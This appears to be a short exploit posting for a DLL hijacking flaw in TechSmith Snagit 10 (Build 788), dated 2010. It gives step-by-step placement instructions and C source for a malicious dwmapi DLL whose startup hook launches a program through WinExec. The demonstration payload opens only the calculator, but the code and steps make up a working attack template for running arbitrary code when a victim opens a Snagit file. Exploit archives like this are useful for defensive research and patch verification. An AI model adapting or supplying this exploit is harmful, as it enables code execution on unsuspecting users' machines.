/*
TechSmith Snagit 10 (Build 788) Dll Hijacking Exploit
By: Encrypt3d.M!nd
Date: 25\8\2010
Download: http://www.techsmith.com/download/snagittrial.asp

Details:
Compile the following code and rename it to dwmapi.dl
and place file with one of the affected types in the same directory of the dll

Affected types: snag , snagcc , snagprof

Code :(used the one from this advisory:http://www.exploit-db.com/exploits/14758/):
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void hook_startup() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

// POC: http://www.exploit-db.com/sploits/14764.zip
